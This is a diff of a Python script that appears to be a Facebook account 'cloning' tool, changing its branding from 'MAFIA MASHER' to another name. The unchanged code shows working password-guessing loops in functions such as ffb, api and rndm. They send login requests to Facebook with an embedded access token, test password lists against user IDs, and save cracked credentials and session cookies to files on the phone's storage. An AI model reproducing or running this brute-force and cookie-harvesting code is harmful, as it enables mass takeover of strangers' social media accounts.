@@ -177,8 +177,8 @@ def menu():
         #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] File Cloning')
-                        print(' [2] Random Cloning')                        
+                        print(' [1] FILE CLONING')
+                        print(' [2] RANDOM CLONING')                        
                         print(' [0] EXIT')
                         linex()
                         xd=input(' [~] Put Any option : ')                        
@@ -286,7 +286,7 @@ def pak():
 def ffb(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [MAFIA MASHER] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -334,25 +334,25 @@ def ffb(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [MAFIA MASHER] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                      
-                                        open('/sdcard/MAFIA MASHER-OK-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/MAFIA MASHER-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-OK-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[MAFIA MASHER] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [MAFIA MASHER] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/MAFIA MASHER-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;205m [𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/MAFIA MASHER-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -364,7 +364,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [MAFIA MASHER] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -448,23 +448,23 @@ def api(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [MAFIA MASHER] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MAFIA MASHER-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[MAFIA MASHER] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [CP-MAFIA MASHER] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/MAFIA MASHER-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [CP-𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/MAFIA MASHER-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -475,7 +475,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;32m [MAFIA MASHER] %s| \033[1;32mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;32m [𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] %s| \033[1;32mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -525,18 +525,18 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [OK-MAFIA MASHER] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/MAFIA MASHER-OK.txt','a').write(ids+'|'+pas+'\n')                                        
+                                        print('\r\r\033[1;32m [OK-𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-OK.txt','a').write(ids+'|'+pas+'\n')                                        
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\033[1;31m [CP-MAFIA MASHER] '+ids+' | '+pas+'\033[1;97m')                                                
-                                                open('/sdcard/MAFIA MASHER-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\033[1;31m [CP-𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+ids+' | '+pas+'\033[1;97m')                                                
+                                                open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/MAFIA MASHER-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -548,7 +548,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[1;37m [MAFIA MASHER] %s| \033[1;32mOK \033[1;37m: \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] %s| \033[1;32mOK \033[1;37m: \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -622,10 +622,10 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [OK-MAFIA MASHER] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [OK-𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                       
-                                        open('/sdcard/MAFIA MASHER-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        open('/sdcard/MAFIA MASHER-OK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-OK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -635,8 +635,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[1;31m [CP-MAFIA MASHER] '+str(uid)+' | '+pas+'\033[1;97m')                                     
-                                        open('/sdcard/MAFIA MASHER-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;31m [CP-𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋] '+str(uid)+' | '+pas+'\033[1;97m')                                     
+                                        open('/sdcard/𝐏𝐀𝐊𝐓𝐈𝐘𝐀𝐖𝐀𝐋-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
